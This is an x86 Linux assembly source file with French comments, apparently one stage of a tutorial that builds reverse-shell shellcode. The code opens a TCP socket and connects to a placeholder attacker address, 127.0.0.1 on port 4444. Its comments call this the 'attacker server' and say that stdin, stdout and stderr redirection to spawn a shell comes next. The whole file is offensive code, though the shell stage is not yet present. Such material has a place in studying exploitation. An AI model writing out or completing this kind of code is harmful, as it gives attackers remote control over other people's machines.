section .data
    ; Définitions des constantes
    IP equ 0x0100007f         ; 127.0.0.1 en format réseau (little endian)
    PORT equ 0x5c11           ; Port 4444 en format réseau (little endian)

section .bss
    sockaddr resb 16          ; Structure pour stocker l'adresse du serveur

section .text
    global _start

_start:
    ; Étape 1 : Créer un socket (code précédent)
    mov eax, 102        ; syscall socketcall
    mov ebx, 1          ; SYS_SOCKET
    push dword 0        ; IPPROTO_IP
    push dword 1        ; SOCK_STREAM
    push dword 2        ; AF_INET
    mov ecx, esp        ; ecx pointe vers les arguments
    int 0x80
    
    mov edi, eax        ; Sauvegarder le descripteur de fichier du socket
    test eax, eax
    js socket_error

    ; Étape 2 : Configurer l'adresse du serveur
    ; struct sockaddr_in {
    ;     short sin_family;     // AF_INET
    ;     unsigned short sin_port;    // Port
    ;     struct in_addr sin_addr;    // Adresse IP
    ;     char sin_zero[8];     // Padding
    ; };
    
    ; Initialisation de la structure sockaddr_in
    mov dword [sockaddr], 0          ; Mise à zéro
    mov dword [sockaddr+4], 0        ; Mise à zéro
    mov dword [sockaddr+8], 0        ; Mise à zéro
    mov dword [sockaddr+12], 0       ; Mise à zéro
    
    mov word [sockaddr], 2           ; AF_INET (famille d'adresses)
    mov word [sockaddr+2], PORT      ; Port en format réseau
    mov dword [sockaddr+4], IP       ; Adresse IP en format réseau
    
    ; Étape 3 : Se connecter au serveur
    ; connect(sockfd, &sockaddr, sizeof(sockaddr))
    mov eax, 102        ; syscall socketcall
    mov ebx, 3          ; SYS_CONNECT
    
    ; Préparer les arguments pour connect()
    push dword 16       ; sizeof(sockaddr)
    push dword sockaddr ; &sockaddr
    push dword edi      ; sockfd (sauvegardé précédemment)
    
    mov ecx, esp        ; ecx pointe vers les arguments
    int 0x80
    
    ; Vérifier si la connexion a réussi (eax < 0 signifie erreur)
    test eax, eax
    js connect_error

    ; À ce stade, nous sommes connectés au serveur attaquant !
    ; Nous ajouterons la redirection des flux stdin/stdout/stderr dans l'étape suivante

    jmp exit

socket_error:
    ; Gérer l'erreur de socket
    jmp exit

connect_error:
    ; Gérer l'erreur de connexion
    jmp exit

exit:
    ; exit(0)
    mov eax, 1
    xor ebx, ebx
    int 0x80
